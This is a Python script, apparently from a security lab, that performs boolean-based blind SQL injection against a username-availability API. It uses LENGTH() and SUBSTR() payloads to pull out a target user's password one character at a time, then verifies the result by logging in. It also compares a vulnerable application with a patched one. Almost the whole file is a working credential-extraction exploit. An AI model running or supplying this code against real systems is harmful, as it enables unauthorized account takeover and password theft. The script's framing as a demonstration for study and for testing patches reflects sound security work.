#!/usr/bin/env python3
"""
Blind SQL Injection Password Extractor
Demonstrates character-by-character password extraction using boolean-based blind SQLi
"""

import requests
import sys
import string
from time import sleep

# Character set to test (printable ASCII)
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation

def extract_password_length(base_url, username, max_length=50):
    """
    Extract the length of the password using boolean-based blind SQLi
    """
    print(f"\n[*] Extracting password length for user '{username}'...")

    for length in range(1, max_length + 1):
        # Craft payload to test password length
        payload = f"{username}' AND LENGTH(password)={length} --"

        response = requests.get(f"{base_url}/api/check_username",
                                 params={'username': payload})
        result = response.json()

        # If username is "taken", the condition was true
        if not result.get('available'):  # available=False means username exists
            print(f"[+] Password length found: {length}")
            return length

        # Add small delay to avoid overwhelming the server
        sleep(0.1)

    print(f"[!] Could not determine password length (tested up to {max_length})")
    return None

def extract_password_char(base_url, username, position, charset=CHARSET):
    """
    Extract a single character of the password at the given position
    """
    for char in charset:
        # Craft payload to test character at position
        # Note: SQL uses 1-based indexing
        payload = f"{username}' AND SUBSTR(password,{position},1)='{char}' --"

        try:
            response = requests.get(f"{base_url}/api/check_username",
                                     params={'username': payload},
                                     timeout=5)
            result = response.json()

            # If username is "taken", the condition was true
            if not result.get('available'):
                return char

            # Small delay between requests
            sleep(0.05)

        except Exception as e:
            print(f"[!] Error testing character '{char}': {e}")
            continue

    return None

def extract_password(base_url, username):
    """
    Extract the complete password character by character
    """
    print("=" * 70)
    print(f"BLIND SQL INJECTION PASSWORD EXTRACTION")
    print(f"Target: {base_url}")
    print(f"Username: {username}")
    print("=" * 70)

    # Step 1: Determine password length
    password_length = extract_password_length(base_url, username)

    if not password_length:
        print("[!] Failed to extract password length")
        return None

    # Step 2: Extract each character
    password = ""
    print(f"\n[*] Extracting password ({password_length} characters)...")
    print("[*] Progress: ", end="", flush=True)

    for position in range(1, password_length + 1):
        char = extract_password_char(base_url, username, position)

        if char:
            password += char
            print(char, end="", flush=True)
        else:
            print("?", end="", flush=True)
            password += "?"

        # Show progress
        if position % 5 == 0:
            print(f" [{position}/{password_length}]", end="", flush=True)

    print()  # New line after progress
    print("\n" + "=" * 70)
    print(f"[+] EXTRACTED PASSWORD: {password}")
    print("=" * 70)

    return password

def verify_password(base_url, username, password):
    """
    Verify the extracted password by attempting to login
    """
    print(f"\n[*] Verifying password...")

    login_data = {'username': username, 'password': password}
    response = requests.post(f"{base_url}/api/login", data=login_data)
    result = response.json()

    if result.get('success'):
        print(f"[+] SUCCESS: Password verified! Login successful.")
        return True
    else:
        print(f"[!] FAILED: Password incorrect or login failed.")
        return False

def demonstrate_extraction(base_url, target_username="admin"):
    """
    Full demonstration of blind SQL injection password extraction
    """
    print("\n" + "=" * 70)
    print("BLIND SQL INJECTION DEMONSTRATION")
    print("=" * 70)
    print("\nThis script demonstrates how an attacker can extract passwords")
    print("character-by-character using boolean-based blind SQL injection.")
    print("\nHow it works:")
    print("1. Test password length using LENGTH() function")
    print("2. For each position, test all possible characters")
    print("3. Use SUBSTR() to check each character")
    print("4. Observe TRUE (username taken) vs FALSE (username available)")
    print("=" * 70)

    # Extract the password
    password = extract_password(base_url, target_username)

    if password and '?' not in password:
        # Verify the password
        verify_password(base_url, target_username, password)
    elif password:
        print("\n[!] Warning: Some characters could not be extracted (marked with '?')")
        print("[*] This may be due to:")
        print("    - Characters not in the charset")
        print("    - Network errors")
        print("    - Server-side protections")

    return password

def compare_vulnerable_vs_patched(vulnerable_url, patched_url, username="admin"):
    """
    Compare blind SQLi on vulnerable vs patched applications
    """
    print("\n" + "=" * 70)
    print("COMPARING VULNERABLE VS PATCHED APPLICATIONS")
    print("=" * 70)

    # Test vulnerable
    print("\n--- Testing VULNERABLE Application ---")
    print(f"URL: {vulnerable_url}")

    # Test a simple boolean-based payload
    test_payload_true = f"{username}' AND '1'='1"
    test_payload_false = f"{username}' AND '1'='2"

    resp_true = requests.get(f"{vulnerable_url}/api/check_username",
                             params={'username': test_payload_true})
    resp_false = requests.get(f"{vulnerable_url}/api/check_username",
                              params={'username': test_payload_false})

    vuln_exploitable = resp_true.json().get('available') != resp_false.json().get('available')

    if vuln_exploitable:
        print("[!] VULNERABLE: Boolean-based blind SQLi possible")
        print("[*] Attempting password extraction...")
        vuln_password = extract_password(vulnerable_url, username)
    else:
        print("[+] SECURE: Boolean-based blind SQLi prevented")
        vuln_password = None

    # Test patched
    print("\n--- Testing PATCHED Application ---")
    print(f"URL: {patched_url}")

    resp_true = requests.get(f"{patched_url}/api/check_username",
                             params={'username': test_payload_true})
    resp_false = requests.get(f"{patched_url}/api/check_username",
                              params={'username': test_payload_false})

    patched_exploitable = resp_true.json().get('available') != resp_false.json().get('available')

    if patched_exploitable:
        print("[!] VULNERABLE: Boolean-based blind SQLi possible")
        print("[*] Attempting password extraction...")
        patched_password = extract_password(patched_url, username)
    else:
        print("[+] SECURE: Boolean-based blind SQLi prevented")
        patched_password = None

    # Summary
    print("\n" + "=" * 70)
    print("COMPARISON SUMMARY")
    print("=" * 70)
    print(f"Vulnerable App: {'EXPLOITABLE ✗' if vuln_exploitable else 'SECURE ✓'}")
    if vuln_password:
        print(f"  Extracted Password: {vuln_password}")
    print(f"\nPatched App: {'EXPLOITABLE ✗' if patched_exploitable else 'SECURE ✓'}")
    if patched_password:
        print(f"  Extracted Password: {patched_password}")
    else:
        print(f"  Password extraction: BLOCKED")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:")
        print("  Single target:  python3 blind_sqli_extractor.py <url> [username]")
        print("  Compare:        python3 blind_sqli_extractor.py <vulnerable_url> <patched_url> [username]")
        print("\nExamples:")
        print("  python3 blind_sqli_extractor.py http://localhost:5000 admin")
        print("  python3 blind_sqli_extractor.py http://localhost:5000 http://localhost:5001 admin")
        sys.exit(1)

    if len(sys.argv) == 2:
        # Single target mode
        base_url = sys.argv[1].rstrip('/')
        username = "admin"
        demonstrate_extraction(base_url, username)

    elif len(sys.argv) == 3:
        # Check if second arg is another URL or a username
        if sys.argv[2].startswith('http'):
            # Compare mode
            vulnerable_url = sys.argv[1].rstrip('/')
            patched_url = sys.argv[2].rstrip('/')
            username = "admin"
            compare_vulnerable_vs_patched(vulnerable_url, patched_url, username)
        else:
            # Single target with custom username
            base_url = sys.argv[1].rstrip('/')
            username = sys.argv[2]
            demonstrate_extraction(base_url, username)

    elif len(sys.argv) == 4:
        # Compare mode with custom username
        vulnerable_url = sys.argv[1].rstrip('/')
        patched_url = sys.argv[2].rstrip('/')
        username = sys.argv[3]
        compare_vulnerable_vs_patched(vulnerable_url, patched_url, username)
